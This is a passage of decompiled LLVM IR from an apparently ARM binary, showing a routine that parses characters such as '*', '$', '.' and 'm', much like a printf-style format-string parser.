dec_label_pc_244c0:                               ; preds = %bb147, %dec_label_pc_243f4, %dec_label_pc_24450, %dec_label_pc_244bc
  %v1_24500 = phi i32 [ %v0_2448476, %dec_label_pc_244bc ], [ %v0_2445c, %bb147 ], [ %v0_2445c, %dec_label_pc_24450 ], [ %v0_2445c, %dec_label_pc_243f4 ]
  %v0_244fc = phi i32 [ %v5_24480, %dec_label_pc_244bc ], [ %v0_243f4, %bb147 ], [ %v0_243f4, %dec_label_pc_24450 ], [ %v0_243f4, %dec_label_pc_243f4 ]
  %stack_var_-44.3 = phi i32 [ %stack_var_-44.2, %dec_label_pc_244bc ], [ %stack_var_-44.1, %bb147 ], [ %stack_var_-44.1, %dec_label_pc_24450 ], [ %stack_var_-44.1, %dec_label_pc_243f4 ]
  %v1_244c0 = inttoptr i32 %v0_244fc to i8*
  %v2_244c0 = load i8, i8* %v1_244c0, align 1
  %v3_244c0 = zext i8 %v2_244c0 to i32
  store i32 %v3_244c0, i32* %r3.global-to-local, align 4
  %v7_244c4 = icmp eq i8 %v2_244c0, 42
  br i1 %v7_244c4, label %dec_label_pc_244cc, label %dec_label_pc_2450c

dec_label_pc_244cc:                               ; preds = %dec_label_pc_244c0
  %v0_244cc = load i32, i32* %fp.global-to-local, align 4
  %v2_244cc = icmp eq i32 %v0_244cc, 0
  br i1 %v2_244cc, label %dec_label_pc_244fc, label %dec_label_pc_244d4

dec_label_pc_244d4:                               ; preds = %dec_label_pc_244cc
  %v1_244d4 = inttoptr i32 %v1_24500 to i8*
  %v2_244d4 = load i8, i8* %v1_244d4, align 1
  %v3_244d4 = zext i8 %v2_244d4 to i32
  store i32 %v3_244d4, i32* %r3.global-to-local, align 4
  %v7_244d8 = icmp eq i8 %v2_244d4, 36
  br i1 %v7_244d8, label %dec_label_pc_244e0, label %dec_label_pc_247f4

dec_label_pc_244e0:                               ; preds = %dec_label_pc_244d4
  %v0_244e0 = load i32, i32* %r1.global-to-local, align 4
  %tmp148 = icmp slt i32 %v0_244e0, 1
  br i1 %tmp148, label %dec_label_pc_247f4, label %dec_label_pc_244e8

dec_label_pc_244e8:                               ; preds = %dec_label_pc_244e0
  %v0_244ec = load i32, i32* %r8.global-to-local, align 4
  %v1_244ec = load i32, i32* %sb.global-to-local, align 4
  %v3_244ec = mul i32 %v1_244ec, %v0_244ec
  %v4_244ec = add i32 %v3_244ec, %v3_24380.pre-phi
  store i32 %v4_244ec, i32* %r3.global-to-local, align 4
  %v1_244f0 = add i32 %v1_24500, 1
  store i32 %v1_244f0, i32* %r6.global-to-local, align 4
  %v2_244f4 = add i32 %v4_244ec, -12
  %v3_244f4 = inttoptr i32 %v2_244f4 to i32*
  store i32 %v0_244e0, i32* %v3_244f4, align 4
  br label %dec_label_pc_24508

dec_label_pc_244fc:                               ; preds = %dec_label_pc_244cc
  %v1_244fc = add i32 %v0_244fc, 1
  store i32 %v1_244fc, i32* %r3.global-to-local, align 4
  %v9_24500 = icmp eq i32 %v1_244fc, %v1_24500
  br i1 %v9_24500, label %dec_label_pc_24508, label %dec_label_pc_247f4

dec_label_pc_24508:                               ; preds = %dec_label_pc_244fc, %dec_label_pc_244e8
  store i32 -2147483648, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_2450c

dec_label_pc_2450c:                               ; preds = %dec_label_pc_244c0, %dec_label_pc_24508
  %v0_2450c = load i32, i32* %r8.global-to-local, align 4
  %v2_2450c = icmp eq i32 %v0_2450c, 0
  br i1 %v2_2450c, label %dec_label_pc_24518, label %dec_label_pc_24538.loopexit

dec_label_pc_24518:                               ; preds = %dec_label_pc_2450c
  %v0_24518 = load i32, i32* %r6.global-to-local, align 4
  %v1_24518 = inttoptr i32 %v0_24518 to i8*
  %v2_24518 = load i8, i8* %v1_24518, align 1
  %v3_24518 = zext i8 %v2_24518 to i32
  store i32 %v3_24518, i32* %r3.global-to-local, align 4
  %v7_2451c = icmp eq i8 %v2_24518, 46
  br i1 %v7_2451c, label %.thread20, label %dec_label_pc_24530

.thread20:                                        ; preds = %dec_label_pc_24518
  %v2_24520 = add i32 %v0_24518, 1
  store i32 %v2_24520, i32* %r6.global-to-local, align 4
  %v1_24524 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v1_24524, i32* %sl.global-to-local, align 4
  store i32 -1, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_24374

dec_label_pc_24530:                               ; preds = %dec_label_pc_24518
  %v0_24530 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_24530, i32* %sl.global-to-local, align 4
  store i32 -1, i32* @r5, align 4
  br label %dec_label_pc_24538

dec_label_pc_24538.loopexit:                      ; preds = %dec_label_pc_2450c
  %v1_24510 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v1_24510, i32* @r5, align 4
  %v0_24544.pre.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_24538

dec_label_pc_24538:                               ; preds = %dec_label_pc_24538.loopexit, %dec_label_pc_24530
  %v0_24544.pre = phi i32 [ %v0_24544.pre.pre, %dec_label_pc_24538.loopexit ], [ %v0_24518, %dec_label_pc_24530 ]
  store i32 -37528, i32* %r3.global-to-local, align 4
  %v0_2453c = load i32, i32* @lr, align 4
  %v2_2453c = add i32 %v0_2453c, -37528
  store i32 %v2_2453c, i32* %r1.global-to-local, align 4
  %v1_24544 = inttoptr i32 %v0_24544.pre to i8*
  br label %dec_label_pc_24540

dec_label_pc_24540:                               ; preds = %dec_label_pc_24554, %dec_label_pc_24538
  %v0_24554 = phi i32 [ %v1_24554, %dec_label_pc_24554 ], [ %v2_2453c, %dec_label_pc_24538 ]
  %v1_24540 = inttoptr i32 %v0_24554 to i8*
  %v2_24540 = load i8, i8* %v1_24540, align 1
  %v3_24540 = zext i8 %v2_24540 to i32
  store i32 %v3_24540, i32* %r2.global-to-local, align 4
  %v2_24544 = load i8, i8* %v1_24544, align 1
  %v3_24544 = zext i8 %v2_24544 to i32
  store i32 %v3_24544, i32* %r3.global-to-local, align 4
  %v9_24548 = icmp eq i8 %v2_24544, %v2_24540
  br i1 %v9_24548, label %bb149, label %dec_label_pc_24554

bb149:                                            ; preds = %dec_label_pc_24540
  %v2_2454c = add i32 %v0_24544.pre, 1
  store i32 %v2_2454c, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_24560

dec_label_pc_24554:                               ; preds = %dec_label_pc_24540
  %v1_24554 = add i32 %v0_24554, 1
  %v2_24554 = inttoptr i32 %v1_24554 to i8*
  %v3_24554 = load i8, i8* %v2_24554, align 1
  %v4_24554 = zext i8 %v3_24554 to i32
  store i32 %v4_24554, i32* %r3.global-to-local, align 4
  store i32 %v1_24554, i32* %r1.global-to-local, align 4
  %v2_24558 = icmp eq i8 %v3_24554, 0
  br i1 %v2_24558, label %dec_label_pc_24560, label %dec_label_pc_24540

dec_label_pc_24560:                               ; preds = %dec_label_pc_24554, %bb149
  %v1_24584 = phi i32 [ %v2_2454c, %bb149 ], [ %v0_24544.pre, %dec_label_pc_24554 ]
  %v1_24580 = phi i32 [ %v0_24554, %bb149 ], [ %v1_24554, %dec_label_pc_24554 ]
  %v2_24568 = sub i32 %v1_24580, %v2_2453c
  store i32 %v2_24568, i32* %r3.global-to-local, align 4
  %v8_24570 = icmp sgt i32 %v2_24568, 1
  br i1 %v8_24570, label %.thread24, label %dec_label_pc_24574

dec_label_pc_24574:                               ; preds = %dec_label_pc_24560
  %v1_24574 = inttoptr i32 %v1_24584 to i8*
  %v2_24574 = load i8, i8* %v1_24574, align 1
  %v3_24574 = zext i8 %v2_24574 to i32
  store i32 %v3_24574, i32* %r2.global-to-local, align 4
  %v1_24578 = inttoptr i32 %v1_24580 to i8*
  %v2_24578 = load i8, i8* %v1_24578, align 1
  %v3_24578 = zext i8 %v2_24578 to i32
  store i32 %v3_24578, i32* %r3.global-to-local, align 4
  %v9_2457c = icmp eq i8 %v2_24574, %v2_24578
  br i1 %v9_2457c, label %bb150, label %.thread24

bb150:                                            ; preds = %dec_label_pc_24574
  %v2_24580 = add i32 %v1_24580, 9
  store i32 %v2_24580, i32* %r1.global-to-local, align 4
  %v2_24584 = add i32 %v1_24584, 1
  store i32 %v2_24584, i32* %r6.global-to-local, align 4
  br label %.thread24

.thread24:                                        ; preds = %dec_label_pc_24574, %dec_label_pc_24560, %bb150
  %v0_2458c = phi i32 [ %v1_24580, %dec_label_pc_24574 ], [ %v1_24580, %dec_label_pc_24560 ], [ %v2_24580, %bb150 ]
  %v0_24588 = phi i32 [ %v1_24584, %dec_label_pc_24574 ], [ %v1_24584, %dec_label_pc_24560 ], [ %v2_24584, %bb150 ]
  %v1_24588 = inttoptr i32 %v0_24588 to i8*
  %v2_24588 = load i8, i8* %v1_24588, align 1
  %v3_24588 = zext i8 %v2_24588 to i32
  store i32 %v3_24588, i32* %r2.global-to-local, align 4
  %v1_2458c = add i32 %v0_2458c, 9
  %v2_2458c = inttoptr i32 %v1_2458c to i8*
  %v3_2458c = load i8, i8* %v2_2458c, align 1
  %v4_2458c = zext i8 %v3_2458c to i32
  store i32 %v4_2458c, i32* %r3.global-to-local, align 4
  %v2_24590 = icmp eq i8 %v2_24588, 0
  %v3_24594 = mul nuw nsw i32 %v4_2458c, 256
  store i32 %v3_24594, i32* @ip, align 4
  br i1 %v2_24590, label %dec_label_pc_247f4, label %dec_label_pc_2459c

dec_label_pc_2459c:                               ; preds = %.thread24
  store i32 -37428, i32* %r3.global-to-local, align 4
  %v2_245a0 = add i32 %v0_2453c, -37428
  store i32 %v2_245a0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_245a4

dec_label_pc_245a4:                               ; preds = %dec_label_pc_24628, %dec_label_pc_2459c
  %v1_245b8 = phi i32 [ %v1_24628, %dec_label_pc_24628 ], [ %v2_245a0, %dec_label_pc_2459c ]
  %v1_245a4 = inttoptr i32 %v1_245b8 to i8*
  %v2_245a4 = load i8, i8* %v1_245a4, align 1
  %v3_245a4 = zext i8 %v2_245a4 to i32
  store i32 %v3_245a4, i32* %r3.global-to-local, align 4
  %v9_245a8 = icmp eq i8 %v2_245a4, %v2_24588
  br i1 %v9_245a8, label %dec_label_pc_245b0, label %dec_label_pc_24628

dec_label_pc_245b0:                               ; preds = %dec_label_pc_245a4
  store i32 %v2_245a0, i32* %r3.global-to-local, align 4
  %v2_245b8 = sub i32 %v1_245b8, %v2_245a0
  store i32 %v2_245b8, i32* %r1.global-to-local, align 4
  %v7_245c0 = icmp slt i32 %v2_245b8, 18
  br i1 %v7_245c0, label %bb152, label %dec_label_pc_245c4

dec_label_pc_245c4:                               ; preds = %dec_label_pc_245b0
  %v1_245c4 = and i32 %v3_24594, 1024
  %v2_245c4 = icmp eq i32 %v1_245c4, 0
  br i1 %v2_245c4, label %bb152, label %bb151

bb151:                                            ; preds = %dec_label_pc_245c4
  %v2_245c8 = add i32 %v2_245b8, -2
  store i32 %v2_245c8, i32* %r1.global-to-local, align 4
  br label %bb152

bb152:                                            ; preds = %dec_label_pc_245b0, %dec_label_pc_245c4, %bb151
  %v0_245d0 = phi i32 [ %v2_245b8, %dec_label_pc_245b0 ], [ %v2_245b8, %dec_label_pc_245c4 ], [ %v2_245c8, %bb151 ]
  store i32 -37476, i32* %r3.global-to-local, align 4
  %v1_245d0 = load i32, i32* %r7.global-to-local, align 4
  %v2_245d0 = add i32 %v1_245d0, 32
  %v3_245d0 = inttoptr i32 %v2_245d0 to i32*
  store i32 %v0_245d0, i32* %v3_245d0, align 4
  %v0_245d4 = load i32, i32* @lr, align 4
  %v1_245d4 = load i32, i32* %r3.global-to-local, align 4
  %v2_245d4 = add i32 %v1_245d4, %v0_245d4
  store i32 %v2_245d4, i32* %r3.global-to-local, align 4
  %v1_245d8 = add i32 %v2_245d4, -1
  store i32 %v1_245d8, i32* %r0.global-to-local, align 4
  %v0_245e0.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_245dc

dec_label_pc_245dc:                               ; preds = %dec_label_pc_245dc, %bb152
  %v0_245dc = phi i32 [ %v1_245dc, %dec_label_pc_245dc ], [ %v1_245d8, %bb152 ]
  %v1_245dc = add i32 %v0_245dc, 1
  %v2_245dc = inttoptr i32 %v1_245dc to i8*
  %v3_245dc = load i8, i8* %v2_245dc, align 1
  %v4_245dc = zext i8 %v3_245dc to i32
  store i32 %v4_245dc, i32* %r3.global-to-local, align 4
  store i32 %v1_245dc, i32* %r0.global-to-local, align 4
  %v8_245e4 = icmp sgt i32 %v0_245e0.pre, %v4_245dc
  br i1 %v8_245e4, label %dec_label_pc_245dc, label %dec_label_pc_245e8

dec_label_pc_245e8:                               ; preds = %dec_label_pc_245dc
  %v2_245f0.neg = sub i32 37476, %v0_245d4
  %v2_245f4 = add i32 %v2_245f0.neg, %v1_245dc
  %v2_245f8 = mul i32 %v2_245f4, 2
  store i32 %v2_245f8, i32* %r2.global-to-local, align 4
  %v2_245fc = add i32 %v0_245d4, -37492
  store i32 %v2_245fc, i32* %r3.global-to-local, align 4
  %v2_24600 = add i32 %v2_245f8, %v2_245fc
  %v3_24600 = inttoptr i32 %v2_24600 to i16*
  %v4_24600 = load i16, i16* %v3_24600, align 2
  %v6_24600 = sext i16 %v4_24600 to i32
  store i32 %v6_24600, i32* %r1.global-to-local, align 4
  %v2_24608 = add i32 %v0_245d4, -37508
  store i32 %v2_24608, i32* %r3.global-to-local, align 4
  %v2_2460c = add i32 %v2_245f8, %v2_24608
  %v3_2460c = inttoptr i32 %v2_2460c to i16*
  %v4_2460c = load i16, i16* %v3_2460c, align 2
  %v6_2460c = sext i16 %v4_2460c to i32
  %v1_24610 = load i32, i32* @ip, align 4
  %v2_24610 = or i32 %v1_24610, %v6_24600
  %v2_24614 = and i32 %v2_24610, %v6_2460c
  store i32 %v2_24614, i32* %r1.global-to-local, align 4
  store i32 -37428, i32* %r3.global-to-local, align 4
  %v2_2461c = add i32 %v0_245d4, -37428
  store i32 %v2_2461c, i32* %r0.global-to-local, align 4
  store i32 %v2_24614, i32* %stack_var_-72, align 4
  %v0_24640.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_24634

dec_label_pc_24628:                               ; preds = %dec_label_pc_245a4
  %v1_24628 = add i32 %v1_245b8, 1
  %v2_24628 = inttoptr i32 %v1_24628 to i8*
  %v3_24628 = load i8, i8* %v2_24628, align 1
  %v4_24628 = zext i8 %v3_24628 to i32
  store i32 %v4_24628, i32* %r3.global-to-local, align 4
  store i32 %v1_24628, i32* %r0.global-to-local, align 4
  %v2_2462c = icmp eq i8 %v3_24628, 0
  br i1 %v2_2462c, label %dec_label_pc_24634, label %dec_label_pc_245a4

dec_label_pc_24634:                               ; preds = %dec_label_pc_24628, %dec_label_pc_245e8
  %v0_24640 = phi i32 [ %v0_24640.pre, %dec_label_pc_245e8 ], [ %v0_24588, %dec_label_pc_24628 ]
  %v0_2463c = phi i32 [ %v1_24610, %dec_label_pc_245e8 ], [ %v3_24594, %dec_label_pc_24628 ]
  %v0_24634 = load i32, i32* @r4, align 4
  %v1_24634 = and i32 %v0_24634, 4
  %v1_24638 = and i32 %v0_24634, -5
  store i32 %v1_24638, i32* %r3.global-to-local, align 4
  %v1_2463c = and i32 %v0_2463c, 3840
  store i32 %v1_2463c, i32* %r2.global-to-local, align 4
  %v1_24640 = inttoptr i32 %v0_24640 to i8*
  %v2_24640 = load i8, i8* %v1_24640, align 1
  %v3_24640 = zext i8 %v2_24640 to i32
  store i32 %v3_24640, i32* %r1.global-to-local, align 4
  %v2_24644 = or i32 %v1_24638, %v1_2463c
  store i32 %v2_24644, i32* %r2.global-to-local, align 4
  %tmp180 = mul nuw nsw i32 %v1_24634, 4
  %tmp181 = or i32 %tmp180, 32
  %v1_24650 = load i32, i32* %r7.global-to-local, align 4
  %v2_24650 = add i32 %v1_24650, 20
  %v3_24650 = inttoptr i32 %v2_24650 to i32*
  store i32 %tmp181, i32* %v3_24650, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_24658 = load i32, i32* %r1.global-to-local, align 4
  %v1_24658 = load i32, i32* %r7.global-to-local, align 4
  %v2_24658 = add i32 %v1_24658, 12
  %v3_24658 = inttoptr i32 %v2_24658 to i32*
  store i32 %v0_24658, i32* %v3_24658, align 4
  %v0_2465c = load i32, i32* %r7.global-to-local, align 4
  %v1_2465c = add i32 %v0_2465c, 4
  %v2_2465c = inttoptr i32 %v1_2465c to i32*
  %v3_2465c = load i32, i32* @r5, align 4
  store i32 %v3_2465c, i32* %v2_2465c, align 4
  %v4_2465c = add i32 %v0_2465c, 8
  %v5_2465c = inttoptr i32 %v4_2465c to i32*
  %v6_2465c = load i32, i32* %sl.global-to-local, align 4
  store i32 %v6_2465c, i32* %v5_2465c, align 4
  %v0_24660 = load i32, i32* %r2.global-to-local, align 4
  %v1_24660 = load i32, i32* %r7.global-to-local, align 4
  %v2_24660 = add i32 %v1_24660, 16
  %v3_24660 = inttoptr i32 %v2_24660 to i32*
  store i32 %v0_24660, i32* %v3_24660, align 4
  %v0_24664 = load i32, i32* %r3.global-to-local, align 4
  %v1_24664 = load i32, i32* %r7.global-to-local, align 4
  %v2_24664 = add i32 %v1_24664, 28
  %v3_24664 = inttoptr i32 %v2_24664 to i32*
  store i32 %v0_24664, i32* %v3_24664, align 4
  %v0_24668 = load i32, i32* %r0.global-to-local, align 4
  %v1_24668 = inttoptr i32 %v0_24668 to i8*
  %v2_24668 = load i8, i8* %v1_24668, align 1
  %v3_24668 = zext i8 %v2_24668 to i32
  store i32 %v3_24668, i32* %r2.global-to-local, align 4
  %v2_2466c = icmp eq i8 %v2_24668, 0
  br i1 %v2_2466c, label %dec_label_pc_24674, label %dec_label_pc_246f8

dec_label_pc_24674:                               ; preds = %dec_label_pc_24634
  %v0_24674 = load i32, i32* %r6.global-to-local, align 4
  %v1_24674 = inttoptr i32 %v0_24674 to i8*
  %v2_24674 = load i8, i8* %v1_24674, align 1
  %v3_24674 = zext i8 %v2_24674 to i32
  store i32 %v3_24674, i32* %r3.global-to-local, align 4
  %v7_24678 = icmp eq i8 %v2_24674, 109
  br i1 %v7_24678, label %.thread28, label %dec_label_pc_2468c

.thread28:                                        ; preds = %dec_label_pc_24674
  store i32 20, i32* %r3.global-to-local, align 4
  %v2_24680 = load i32, i32* %r7.global-to-local, align 4
  %v3_24680 = add i32 %v2_24680, 32
  %v4_24680 = inttoptr i32 %v3_24680 to i32*
  store i32 20, i32* %v4_24680, align 4
  %v1_24684 = load i32, i32* %r2.global-to-local, align 4
  %v2_24684 = load i32, i32* %r7.global-to-local, align 4
  %v3_24684 = add i32 %v2_24684, 28
  %v4_24684 = inttoptr i32 %v3_24684 to i32*
  store i32 %v1_24684, i32* %v4_24684, align 4
  br label %dec_label_pc_246f8

dec_label_pc_2468c:                               ; preds = %dec_label_pc_24674
  store i32 604, i32* %r3.global-to-local, align 4
  %v0_24690 = load i32, i32* @lr, align 4
  %v2_24690 = add i32 %v0_24690, 604
  %v3_24690 = inttoptr i32 %v2_24690 to i32*
  %v4_24690 = load i32, i32* %v3_24690, align 4
  store i32 %v4_24690, i32* %r1.global-to-local, align 4
  store i32 21, i32* %r3.global-to-local, align 4
  %v1_24698 = load i32, i32* %r7.global-to-local, align 4
  %v2_24698 = add i32 %v1_24698, 32
  %v3_24698 = inttoptr i32 %v2_24698 to i32*
  store i32 21, i32* %v3_24698, align 4
  %v0_2469c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_2469c, i32* @ip, align 4
  %v1_246a0 = add i32 %v0_2469c, 10
  store i32 %v1_246a0, i32* %r0.global-to-local, align 4
  %v0_246a8.pre = load i32, i32* %r6.global-to-local, align 4
  %v1_246a8 = inttoptr i32 %v0_246a8.pre to i8*
  br label %dec_label_pc_246a4

dec_label_pc_246a4:                               ; preds = %dec_label_pc_246e8, %dec_label_pc_2468c
  %v1_246b4 = phi i32 [ %v1_246e8, %dec_label_pc_246e8 ], [ %v0_2469c, %dec_label_pc_2468c ]
  %v1_246a4 = inttoptr i32 %v1_246b4 to i8*
  %v2_246a4 = load i8, i8* %v1_246a4, align 1
  %v3_246a4 = zext i8 %v2_246a4 to i32
  store i32 %v3_246a4, i32* %r2.global-to-local, align 4
  %v2_246a8 = load i8, i8* %v1_246a8, align 1
  %v3_246a8 = zext i8 %v2_246a8 to i32
  store i32 %v3_246a8, i32* %r3.global-to-local, align 4
  %v9_246ac = icmp eq i8 %v2_246a4, %v2_246a8
  br i1 %v9_246ac, label %dec_label_pc_246b4, label %dec_label_pc_246e8

dec_label_pc_246b4:                               ; preds = %dec_label_pc_246a4
  %v2_246b4 = sub i32 %v1_246b4, %v0_2469c
  store i32 %v2_246b4, i32* %r3.global-to-local, align 4
  %v0_246bc = load i32, i32* %r7.global-to-local, align 4
  %v1_246bc = add i32 %v0_246bc, 4
  store i32 %v1_246bc, i32* %r0.global-to-local, align 4
  %v0_246c0 = load i32, i32* @lr, align 4
  %v2_246c0 = add i32 %v0_246c0, 28868
  store i32 5, i32* %r1.global-to-local, align 4
  %v2_246c8 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_246c8, i32* %r2.global-to-local, align 4
  %v4_246cc = mul i32 %v2_246b4, 4
  %v5_246cc = add i32 %v2_246c0, %v4_246cc
  %v6_246cc = inttoptr i32 %v5_246cc to i32*
  %v7_246cc = load i32, i32* %v6_246cc, align 4
  store i32 %v7_246cc, i32* @ip, align 4
  store i32 149208, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v7_246cc)
  %v0_246d8 = load i32, i32* %r0.global-to-local, align 4
  %v1_246dc = load i32, i32* %r7.global-to-local, align 4
  %v2_246dc = add i32 %v1_246dc, 28
  %v3_246dc = inttoptr i32 %v2_246dc to i32*
  store i32 %v0_246d8, i32* %v3_246dc, align 4
  %v7_246e0 = icmp sgt i32 %v0_246d8, 5
  br i1 %v7_246e0, label %dec_label_pc_247f4, label %dec_label_pc_246f8

dec_label_pc_246e8:                               ; preds = %dec_label_pc_246a4
  %v1_246e8 = add i32 %v1_246b4, 1
  store i32 %v1_246e8, i32* %r1.global-to-local, align 4
  %v3_246ec = icmp ult i32 %v1_246e8, %v1_246a0
  br i1 %v3_246ec, label %dec_label_pc_246a4, label %dec_label_pc_247f4

dec_label_pc_246f8:                               ; preds = %.thread28, %dec_label_pc_246b4, %dec_label_pc_24634
  %v0_246f8 = load i32, i32* %fp.global-to-local, align 4
  %tmp156 = icmp slt i32 %v0_246f8, 1
  br i1 %tmp156, label %dec_label_pc_247a4, label %dec_label_pc_24700

dec_label_pc_24700:                               ; preds = %dec_label_pc_246f8
  store i32 0, i32* %r8.global-to-local, align 4
  %v9_24718 = add i32 %stack_var_-44.3, -2
  br label %dec_label_pc_24704

dec_label_pc_24704:                               ; preds = %dec_label_pc_2478c, %dec_label_pc_24700
  %v9_24724 = phi i32 [ 0, %dec_label_pc_24700 ], [ %v1_24790, %dec_label_pc_2478c ]
  %v7_24708 = icmp sgt i32 %v9_24724, 2
  br i1 %v7_24708, label %.thread38, label %bb157

.thread38:                                        ; preds = %dec_label_pc_24704
  store i32 %v9_24718, i32* %r3.global-to-local, align 4
  %v10_24724 = add i32 %v9_24724, %v9_24718
  store i32 %v10_24724, i32* %r1.global-to-local, align 4
  br label %bb158

bb157:                                            ; preds = %dec_label_pc_24704
  store i32 %v3_24380.pre-phi, i32* @ip, align 4
  %v12_2470c = mul i32 %v9_24724, 4
  %v13_2470c = add i32 %v12_2470c, %v3_24380.pre-phi
  store i32 %v13_2470c, i32* %r3.global-to-local, align 4
  %v9_24714 = add i32 %v13_2470c, -12
  %v10_24714 = inttoptr i32 %v9_24714 to i8*
  %v11_24714 = load i8, i8* %v10_24714, align 4
  %v12_24714 = zext i8 %v11_24714 to i32
  store i32 %v12_24714, i32* %r2.global-to-local, align 4
  %v9_2471c = load i32, i32* %r7.global-to-local, align 4
  %v10_2471c = add i32 %v9_2471c, %v9_24724
  store i32 %v10_2471c, i32* %r3.global-to-local, align 4
  store i32 %v12_24714, i32* %r1.global-to-local, align 4
  %v11_24728 = add i32 %v10_2471c, 36
  %v12_24728 = inttoptr i32 %v11_24728 to i8*
  store i8 %v11_24714, i8* %v12_24728, align 1
  %v0_2472c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %bb158

bb158:                                            ; preds = %.thread38, %bb157
  %v0_2474c = phi i32 [ %v10_24724, %.thread38 ], [ %v0_2472c.pre, %bb157 ]
  %v1_2472c = load i32, i32* %fp.global-to-local, align 4
  %v2_2472c = sub i32 %v0_2474c, %v1_2472c
  %v4_2472c = xor i32 %v1_2472c, %v0_2474c
  %v5_2472c = xor i32 %v2_2472c, %v0_2474c
  %v6_2472c = and i32 %v5_2472c, %v4_2472c
  %v7_2472c = icmp slt i32 %v6_2472c, 0
  %v8_2472c = icmp slt i32 %v2_2472c, 0
  %v9_2472c = icmp eq i32 %v0_2474c, %v1_2472c
  %v3_24730 = xor i1 %v8_2472c, %v7_2472c
  %v4_24730 = or i1 %v9_2472c, %v3_24730
  br i1 %v4_24730, label %dec_label_pc_24740, label %dec_label_pc_24734

dec_label_pc_24734:                               ; preds = %bb158
  %v1_24734 = add i32 %v0_2474c, -9
  %v3_24734 = sub i32 8, %v0_2474c
  %v4_24734 = and i32 %v3_24734, %v0_2474c
  %v5_24734 = icmp slt i32 %v4_24734, 0
  %v6_24734 = icmp slt i32 %v1_24734, 0
  %v7_24734 = icmp eq i32 %v0_2474c, 9
  %v3_24738 = xor i1 %v6_24734, %v5_24734
  %v4_24738 = or i1 %v7_24734, %v3_24738
  br i1 %v4_24738, label %dec_label_pc_2473c, label %dec_label_pc_247f4

dec_label_pc_2473c:                               ; preds = %dec_label_pc_24734
  store i32 %v0_2474c, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_24740

dec_label_pc_24740:                               ; preds = %bb158, %dec_label_pc_2473c
  store i32 %v3_24380.pre-phi, i32* @r2, align 4
  %v1_24744 = load i32, i32* %r8.global-to-local, align 4
  %v4_24744 = mul i32 %v1_24744, 4
  %v5_24744 = add i32 %v4_24744, %v3_24380.pre-phi
  store i32 %v5_24744, i32* %sb.global-to-local, align 4
  %v1_24748 = add i32 %v5_24744, -40
  %v2_24748 = inttoptr i32 %v1_24748 to i32*
  %v3_24748 = load i32, i32* %v2_24748, align 4
  store i32 %v3_24748, i32* %r5.global-to-local, align 4
  %v1_2474c = add i32 %v0_2474c, -1
  store i32 %v1_2474c, i32* %r3.global-to-local, align 4
  %v0_24750 = load i32, i32* %r7.global-to-local, align 4
  %v4_24750 = mul i32 %v1_2474c, 4
  %v5_24750 = add i32 %v0_24750, %v4_24750
  store i32 %v5_24750, i32* %sl.global-to-local, align 4
  %v7_24754 = icmp eq i32 %v3_24748, 8
  %v1_24758 = add i32 %v5_24750, 40
  %v2_24758 = inttoptr i32 %v1_24758 to i32*
  %v3_24758 = load i32, i32* %v2_24758, align 4
  store i32 %v3_24758, i32* @r0, align 4
  br i1 %v7_24754, label %dec_label_pc_2478c, label %dec_label_pc_24760

dec_label_pc_24760:                               ; preds = %dec_label_pc_24740
  %v9_24760 = icmp eq i32 %v3_24758, %v3_24748
  br i1 %v9_24760, label %dec_label_pc_24784, label %bb159

bb159:                                            ; preds = %dec_label_pc_24760
  %v8_24764 = icmp eq i32 %v3_24758, 8
  br i1 %v8_24764, label %dec_label_pc_24784, label %dec_label_pc_2476c

dec_label_pc_2476c:                               ; preds = %bb159
  %v0_2476c = call i32 @_promoted_size()
  %v0_24774 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_24774, i32* @r0, align 4
  %v0_24778 = call i32 @_promoted_size()
  store i32 %v0_24778, i32* %r0.global-to-local, align 4
  %v8_24780 = icmp sgt i32 %v0_2476c, %v0_24778
  br i1 %v8_24780, label %dec_label_pc_2478c, label %dec_label_pc_2476c.dec_label_pc_24784_crit_edge

dec_label_pc_2476c.dec_label_pc_24784_crit_edge:  ; preds = %dec_label_pc_2476c
  %v0_24784.pre = load i32, i32* %sb.global-to-local, align 4
  %v1_24788.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_24784

dec_label_pc_24784:                               ; preds = %dec_label_pc_2476c.dec_label_pc_24784_crit_edge, %dec_label_pc_24760, %bb159
  %v1_24788 = phi i32 [ %v1_24788.pre, %dec_label_pc_2476c.dec_label_pc_24784_crit_edge ], [ %v5_24750, %dec_label_pc_24760 ], [ %v5_24750, %bb159 ]
  %v0_24784 = phi i32 [ %v0_24784.pre, %dec_label_pc_2476c.dec_label_pc_24784_crit_edge ], [ %v5_24744, %dec_label_pc_24760 ], [ %v5_24744, %bb159 ]
  %v1_24784 = add i32 %v0_24784, -40
  %v2_24784 = inttoptr i32 %v1_24784 to i32*
  %v3_24784 = load i32, i32* %v2_24784, align 4
  store i32 %v3_24784, i32* %r3.global-to-local, align 4
  %v2_24788 = add i32 %v1_24788, 40
  %v3_24788 = inttoptr i32 %v2_24788 to i32*
  store i32 %v3_24784, i32* %v3_24788, align 4
  br label %dec_label_pc_2478c

dec_label_pc_2478c:                               ; preds = %dec_label_pc_2476c, %dec_label_pc_24740, %dec_label_pc_24784
  %v0_2478c = load i32, i32* %r7.global-to-local, align 4
  %v1_2478c = add i32 %v0_2478c, 28
  %v2_2478c = inttoptr i32 %v1_2478c to i32*
  %v3_2478c = load i32, i32* %v2_2478c, align 4
  %v0_24790 = load i32, i32* %r8.global-to-local, align 4
  %v1_24790 = add i32 %v0_24790, 1
  store i32 %v1_24790, i32* %r8.global-to-local, align 4
  %v1_24794 = add i32 %v3_2478c, 2
  store i32 %v1_24794, i32* %r3.global-to-local, align 4
  %v6_2479c = icmp slt i32 %v1_24790, %v1_24794
  br i1 %v6_2479c, label %dec_label_pc_24704, label %dec_label_pc_247c0

